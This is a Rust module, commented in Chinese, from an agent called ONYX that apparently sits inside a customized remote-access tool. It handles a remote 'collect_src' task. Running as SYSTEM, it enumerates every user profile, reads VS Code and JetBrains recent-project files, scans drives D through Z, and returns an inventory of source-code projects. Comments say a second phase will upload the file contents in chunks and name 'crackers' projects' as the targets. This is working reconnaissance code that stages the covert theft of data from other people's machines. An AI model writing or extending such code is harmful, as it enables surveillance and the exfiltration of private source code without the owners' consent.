// ONYX: 源码定位（任务类型 `collect_src`，第一阶段：只出清单，不上传内容）
//
// 目标：回答「这台机器上有没有源码、在哪、是什么项目」。
// 内容上传需要分块传输（OnyxChunk），留到第二阶段。
//
// params: {"roots":["D:\\work"],"max_depth":3,"max_projects":50}
// 返回:   {"ok":true,"projects":[{"path":..,"kind":..,"files":..,"modified":..}],"scanned":..,"truncated":..}
use serde_json::{json, Value};
use std::collections::HashSet;
use std::path::{Path, PathBuf};

const DEFAULT_MAX_DEPTH: usize = 3;
const DEFAULT_MAX_PROJECTS: usize = 50;
/// 扫描目录数上限，防止在 C:\ 上跑成磁盘遍历
const MAX_SCANNED_DIRS: usize = 20000;
/// 这些目录一律不进去
const SKIP_DIRS: &[&str] = &[
    "node_modules",
    ".git",
    "target",
    "bin",
    "obj",
    "dist",
    "build",
    ".vs",
    ".idea",
    "__pycache__",
    "venv",
    ".venv",
    ".next",
    ".nuxt",
    "vendor",
    "packages",
    "AppData",
    "Windows",
    "$Recycle.Bin",
    "System Volume Information",
];

fn env(name: &str) -> String {
    std::env::var(name).unwrap_or_default()
}

/// 按目录里的标记文件判断项目类型
fn detect_kind(dir: &Path) -> Option<&'static str> {
    let has = |name: &str| dir.join(name).exists();
    if has("Cargo.toml") {
        return Some("cargo");
    }
    if has("package.json") {
        return Some("node");
    }
    if has("go.mod") {
        return Some("go");
    }
    if has("pom.xml") || has("build.gradle") {
        return Some("java");
    }
    if has("pyproject.toml") || has("requirements.txt") {
        return Some("python");
    }
    if has("CMakeLists.txt") {
        return Some("cmake");
    }
    if has(".git") {
        return Some("git");
    }
    // VS 工程：目录里任意 .sln / .vcxproj / .csproj
    if let Ok(entries) = std::fs::read_dir(dir) {
        for e in entries.flatten() {
            let n = e.file_name().to_string_lossy().to_lowercase();
            if n.ends_with(".sln") {
                return Some("vs");
            }
            if n.ends_with(".vcxproj") || n.ends_with(".csproj") {
                return Some("msbuild");
            }
        }
    }
    None
}

fn count_files(dir: &Path) -> usize {
    std::fs::read_dir(dir)
        .map(|e| e.flatten().filter(|x| x.path().is_file()).count())
        .unwrap_or(0)
}

fn modified_secs(dir: &Path) -> u64 {
    std::fs::metadata(dir)
        .and_then(|m| m.modified())
        .ok()
        .and_then(|t| t.duration_since(std::time::UNIX_EPOCH).ok())
        .map(|d| d.as_secs())
        .unwrap_or(0)
}

/// VS Code 最近打开过的文件夹：从 storage.json 里抠 file:/// 开头的 folderUri
pub fn vscode_recent(raw: &str) -> Vec<String> {
    let mut out: Vec<String> = Vec::new();
    let mut rest = raw;
    while let Some(pos) = rest.find("file:///") {
        rest = &rest[pos + 8..];
        let end = rest
            .find(|c: char| c == '"' || c == '\\' || c == '\'')
            .unwrap_or(rest.len());
        let uri = &rest[..end];
        if let Some(p) = uri_to_path(uri) {
            if !out.contains(&p) {
                out.push(p);
            }
        }
    }
    out
}

/// file:///d%3A/Users/x → D:\Users\x
fn uri_to_path(uri: &str) -> Option<String> {
    let mut decoded = String::with_capacity(uri.len());
    let bytes = uri.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'%' && i + 2 < bytes.len() {
            let hex = std::str::from_utf8(&bytes[i + 1..i + 3]).ok()?;
            let v = u8::from_str_radix(hex, 16).ok()?;
            decoded.push(v as char);
            i += 3;
        } else {
            decoded.push(bytes[i] as char);
            i += 1;
        }
    }
    let path = decoded.replace('/', "\\");
    let trimmed = path.trim_start_matches('\\');
    if trimmed.is_empty() {
        return None;
    }
    Some(trimmed.to_owned())
}

/// JetBrains recentProjects.xml 里的 $USER_HOME$/...
fn jetbrains_recent(raw: &str, home: &str) -> Vec<String> {
    let mut out: Vec<String> = Vec::new();
    let mut rest = raw;
    while let Some(pos) = rest.find("$USER_HOME$") {
        rest = &rest[pos..];
        let end = rest.find('"').unwrap_or(rest.len());
        let raw_path = &rest[..end];
        let p = raw_path.replace("$USER_HOME$", home).replace('/', "\\");
        if !out.contains(&p) {
            out.push(p);
        }
        rest = &rest[end..];
        if rest.is_empty() {
            break;
        }
        rest = &rest[1..];
    }
    out
}

fn read_text(path: PathBuf) -> String {
    std::fs::read_to_string(path).unwrap_or_default()
}

/// 枚举真实用户目录。
/// 关键：agent 以 SYSTEM 运行，`USERPROFILE` 指向 systemprofile，
/// 直接用它什么都找不到，必须自己列 C:\Users\*。
pub fn user_homes() -> Vec<String> {
    const SKIP: &[&str] = &[
        "public",
        "default",
        "default user",
        "all users",
        "defaultapppool",
        "wdagutilityaccount",
    ];
    let mut homes: Vec<String> = Vec::new();
    if let Ok(entries) = std::fs::read_dir("C:\\Users") {
        for e in entries.flatten() {
            if !e.path().is_dir() {
                continue;
            }
            let name = e.file_name().to_string_lossy().to_lowercase();
            if SKIP.contains(&name.as_str()) {
                continue;
            }
            homes.push(e.path().to_string_lossy().to_string());
        }
    }
    let up = env("USERPROFILE");
    if !up.is_empty() && !homes.iter().any(|h| h.eq_ignore_ascii_case(&up)) {
        homes.push(up);
    }
    homes
}

/// 同一个用户名在其他盘上的同名目录。
/// 很多人把桌面/文档重定向到 D 盘（`D:\Users\<name>\Desktop`），
/// 只认 `C:\Users\<name>` 会漏掉真正的项目。
fn candidate_bases(home: &str) -> Vec<String> {
    let mut out = vec![home.to_owned()];
    let name = match Path::new(home).file_name().and_then(|x| x.to_str()) {
        Some(n) => n.to_owned(),
        None => return out,
    };
    for letter in b'D'..=b'Z' {
        let p = format!("{}:\\Users\\{}", letter as char, name);
        if Path::new(&p).is_dir() {
            out.push(p);
        }
    }
    out
}

fn default_roots() -> Vec<String> {
    let homes = user_homes();
    let mut roots: Vec<String> = Vec::new();
    for home in &homes {
        for base in candidate_bases(home) {
            for sub in ["source\\repos", "Desktop", "Documents", "Projects", "Downloads"] {
                let p = format!("{base}\\{sub}");
                if Path::new(&p).is_dir() {
                    roots.push(p);
                }
            }
            // VS Code 最近项目
            let vscode = read_text(PathBuf::from(format!(
                "{base}\\AppData\\Roaming\\Code\\User\\globalStorage\\storage.json"
            )));
            for p in vscode_recent(&vscode) {
                if Path::new(&p).is_dir() {
                    roots.push(p);
                }
            }
            // JetBrains 最近项目
            let jb_root = format!("{base}\\AppData\\Roaming\\JetBrains");
            if let Ok(entries) = std::fs::read_dir(&jb_root) {
                for e in entries.flatten() {
                    let raw = read_text(e.path().join("options").join("recentProjects.xml"));
                    for p in jetbrains_recent(&raw, &base) {
                        if Path::new(&p).is_dir() {
                            roots.push(p);
                        }
                    }
                }
            }
        }
    }
    // 其他盘的顶层：破解者的工程常在 D:\ / E:\ 根下，而不是用户目录里。
    // 深度仍受 max_depth 与 MAX_SCANNED_DIRS 限制，不会变成全盘遍历。
    for letter in b'D'..=b'Z' {
        let root = format!("{}:\\", letter as char);
        if Path::new(&root).is_dir() {
            roots.push(root);
        }
    }
    roots.sort();
    roots.dedup();
    roots
}

pub fn collect(params: &[u8]) -> String {
    let v: Value = serde_json::from_slice(params).unwrap_or(Value::Null);
    let max_depth = v
        .get("max_depth")
        .and_then(|x| x.as_u64())
        .unwrap_or(DEFAULT_MAX_DEPTH as u64)
        .clamp(1, 6) as usize;
    let max_projects = v
        .get("max_projects")
        .and_then(|x| x.as_u64())
        .unwrap_or(DEFAULT_MAX_PROJECTS as u64)
        .clamp(1, 200) as usize;
    let roots: Vec<String> = match v.get("roots").and_then(|x| x.as_array()) {
        Some(arr) => arr
            .iter()
            .filter_map(|x| x.as_str().map(|s| s.to_owned()))
            .filter(|s| Path::new(s).is_dir())
            .collect(),
        None => default_roots(),
    };

    let mut projects: Vec<Value> = Vec::new();
    let mut visited: HashSet<PathBuf> = HashSet::new();
    let mut scanned = 0usize;
    let mut queue: Vec<(PathBuf, usize)> = roots
        .iter()
        .map(|r| (PathBuf::from(r), 0usize))
        .collect();
    let mut truncated = false;

    while let Some((dir, depth)) = queue.pop() {
        if scanned >= MAX_SCANNED_DIRS {
            truncated = true;
            break;
        }
        if !visited.insert(dir.clone()) {
            continue;
        }
        scanned += 1;

        if let Some(kind) = detect_kind(&dir) {
            projects.push(json!({
                "path": dir.to_string_lossy(),
                "kind": kind,
                "files": count_files(&dir),
                "modified": modified_secs(&dir),
            }));
            if projects.len() >= max_projects {
                truncated = true;
                break;
            }
            continue; // 项目根不再往下钻，避免把源码目录全列出来
        }

        if depth >= max_depth {
            continue;
        }
        if let Ok(entries) = std::fs::read_dir(&dir) {
            for e in entries.flatten() {
                let p = e.path();
                if !p.is_dir() {
                    continue;
                }
                let name = e.file_name().to_string_lossy().to_lowercase();
                if name.starts_with('.') || SKIP_DIRS.iter().any(|s| s.to_lowercase() == name) {
                    continue;
                }
                queue.push((p, depth + 1));
            }
        }
    }

    projects.sort_by(|a, b| {
        b.get("modified")
            .and_then(|x| x.as_u64())
            .unwrap_or(0)
            .cmp(&a.get("modified").and_then(|x| x.as_u64()).unwrap_or(0))
    });

    json!({
        "ok": true,
        "roots": roots,
        "projects": projects,
        "scanned": scanned,
        "truncated": truncated,
    })
    .to_string()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn uri_decoding() {
        assert_eq!(uri_to_path("d%3A/Users/x/proj").as_deref(), Some("d:\\Users\\x\\proj"));
        assert_eq!(uri_to_path("c%3A/work").as_deref(), Some("c:\\work"));
        assert!(uri_to_path("").is_none());
    }

    #[test]
    fn vscode_recent_extracts() {
        let raw = r#"{"a":{"folderUri":"file:///d%3A/Users/Administrator/Desktop/RustDeskCustom"},"b":{"folderUri":"file:///e%3A/work"}}"#;
        let got = vscode_recent(raw);
        assert!(got.iter().any(|p| p.ends_with("RustDeskCustom")), "{got:?}");
        assert_eq!(got.len(), 2);
    }

    #[test]
    fn jetbrains_recent_extracts() {
        let raw = r#"<option value="$USER_HOME$/Desktop/proj" />"#;
        let got = jetbrains_recent(raw, "C:\\Users\\Administrator");
        assert_eq!(got, vec!["C:\\Users\\Administrator\\Desktop\\proj".to_owned()]);
    }

    #[test]
    fn detects_cargo_project() {
        let dir = Path::new(env!("CARGO_MANIFEST_DIR"));
        assert_eq!(detect_kind(dir), Some("cargo"));
    }

    #[test]
    fn collect_finds_this_crate() {
        let params = format!(
            r#"{{"roots":["{}"],"max_depth":1}}"#,
            env!("CARGO_MANIFEST_DIR").replace('\\', "\\\\")
        );
        let out = collect(params.as_bytes());
        let v: Value = serde_json::from_str(&out).unwrap();
        assert_eq!(v["ok"], true);
        let projects = v["projects"].as_array().unwrap();
        assert!(
            projects
                .iter()
                .any(|p| p["path"].as_str().unwrap_or_default().contains("RustDeskCustom")),
            "{out}"
        );
    }

    #[test]
    fn bad_params_fall_back_to_defaults() {
        let out = collect(b"not json");
        let v: Value = serde_json::from_str(&out).unwrap();
        assert_eq!(v["ok"], true);
    }
}
